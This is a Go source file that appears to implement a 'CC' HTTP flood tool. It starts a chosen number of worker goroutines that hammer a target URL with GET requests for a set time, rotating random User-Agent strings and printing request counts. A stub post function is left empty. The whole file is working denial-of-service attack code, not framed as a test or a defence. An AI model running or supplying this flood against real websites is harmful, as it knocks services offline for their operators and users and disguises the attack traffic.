package src

import (
	"fmt"
	"gopkg.in/go-playground/validator.v9"
	"io"
	"io/ioutil"
	"net/http"
	"sync/atomic"
	"time"
)

type CC struct {
	Url    string `validate:"url,required"`
	Worker int    `validate:"required,gt=1"`
	Time   int    `validate:"required,gt=1"`
	*Scheduler
	*Report
	*useragent
}

type Scheduler struct {
	Signal *chan bool
	Done   func()
}

type Report struct {
	Request int32
}

func (c *CC) New() error {
	c.Report = new(Report)
	c.Scheduler = new(Scheduler)
	c.useragent = newUA()

	ch := make(chan bool)
	c.Scheduler.Signal = &ch
	c.Scheduler.Done = c.ShutDown()

	v := validator.New()
	err := v.Struct(c)
	return err
}

func (c *CC) Start() {
	tick := time.Tick(1 * time.Second)
	for i := 0; i < c.Worker; i++ {
		go func() {
			for {
				select {
				case <-(*c.Scheduler.Signal):
					return
				case <-tick:
					fmt.Printf("\rworkers: %d | times: %d | toal requests: %d ", c.Worker, c.Time, c.Report.Request)
				default:
					resp, err := get(c.Url, c.useragent.random())
					atomic.AddInt32(&c.Report.Request, 1)
					if err == nil {
						_, _ = io.Copy(ioutil.Discard, resp.Body)
						_ = resp.Body.Close()
					} else {
						fmt.Println(err)
					}
				}
			}
		}()
	}

	time.Sleep(time.Duration(c.Time) * time.Second)
}

func (c *CC) ShutDown() func() {
	return func() {
		for i := 0; i < c.Worker; i++ {
			*c.Scheduler.Signal <- true
			fmt.Println(i)
		}
		close(*c.Scheduler.Signal)
	}
}

func get(url, useragent string) (*http.Response, error) {
	request, _ := http.NewRequest(http.MethodGet, url, nil)
	request.Header.Add("User-Agent", useragent)

	client := &http.Client{
		//Timeout: 3 * time.Second,
	}
	resp, err := client.Do(request)

	return resp, err
}

func post(url, useragent string) {

}
